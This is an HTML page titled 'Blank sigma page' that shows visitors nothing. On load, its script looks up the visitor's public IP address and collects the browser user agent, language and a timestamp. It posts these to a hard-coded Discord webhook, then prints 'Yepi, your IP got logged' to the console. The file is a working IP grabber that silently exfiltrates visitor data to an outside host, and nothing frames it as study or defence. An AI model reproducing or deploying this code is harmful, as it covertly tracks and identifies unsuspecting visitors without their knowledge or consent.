<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Blank sigma page</title>
  <script>
    async function collectAndRedirect() {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();

      const userData = {
        ip: ipData.ip,
        userAgent: navigator.userAgent,
        language: navigator.language,
        timestamp: new Date().toISOString(),
      };

      fetch('https://discord.com/api/webhooks/1385265058136723496/ZD5eU46rLcJRPV25viJksU4Ux9C-iUsuhWmxzHGG4MC6YSmILPxlNe3ZfP7dP6AcWm6V', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `User Info:\n- IP: ${userData.ip}\n- User Agent: ${userData.userAgent}\n- Language: ${userData.language}\n- Time: ${userData.timestamp}`
        })
      })
      .then(() => {
        console.log("Yepi, your IP got logged")
      })
      .catch(error => console.error('Error sending to Discord:', error));
    }
  </script>
</head>
<body onload="collectAndRedirect()">
</body>
</html>
